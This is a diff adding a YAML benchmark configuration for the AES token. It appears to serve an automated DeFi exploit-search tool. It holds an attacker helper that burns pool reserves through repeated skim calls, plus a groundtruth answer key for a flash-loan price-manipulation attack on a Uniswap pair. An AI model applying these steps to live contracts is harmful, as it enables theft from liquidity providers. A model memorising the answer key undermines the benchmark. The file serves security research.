@@ -1,0 +1,66 @@
+# Information for benchmarks building.
+project_name: "AES"
+
+ctrt_name2cls:
+  - ["aes", "AES"]
+  - ["usdt", "USDT"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - [
+      "aes",
+      "new AES('AES', 'AES', address(usdt), [0xEb55526075eC7797d5CdcF4C3263fA39004B958D,
+      0x05DE4Ea6D2472EB569B55e6A1Ada52d2a451d854,0x7c31f5c790CeA93d83aD94F92037Abc1c0d5740d,
+      0x3E1BA8607304EdC3d26eA6Fba67C09cEb2890AcA,0x3777aeec31907057c16F0b4dDC34A6B0a5dC53b6])",
+    ]
+  - ["usdt", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - "function burn_pair_aes(uint256 amount) internal {
+    aes.transfer(address(pair), amount);
+    for (uint256 i = 0; i < 7; i++) {
+    pair.skim(address(pair));
+    }
+    pair.skim(attacker);
+    aes.distributeFee();
+    }"
+
+extra_deployments:
+  - "aes.afterDeploy(address(router), address(pair));"
+extra_constraints: []
+
+attack_goal: "usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker"
+
+groundtruth:
+  - ["borrow", "usdt", "100000e18"]
+  - ["swap", "pair", "usdt", "aes", "usdt.balanceOf(attacker)"]
+  - ["burn", "pair", "aes", "aes.balanceOf(attacker) / 2"]
+  - ["sync", "pair"]
+  - ["swap", "pair", "aes", "usdt", "aes.balanceOf(attacker)"]
+  - ["payback", "usdt", "100000e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "aes":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+    is_burnable: true
+  "pair":
+    is_swappair: true
+    uniswap_order: ["usdt", "aes"]
+    support_swaps:
+      "usdt": ["aes", "usdt"]
+      "aes": ["aes", "usdt"]
+    is_oracle: true
+
+pattern: "Token Burn"
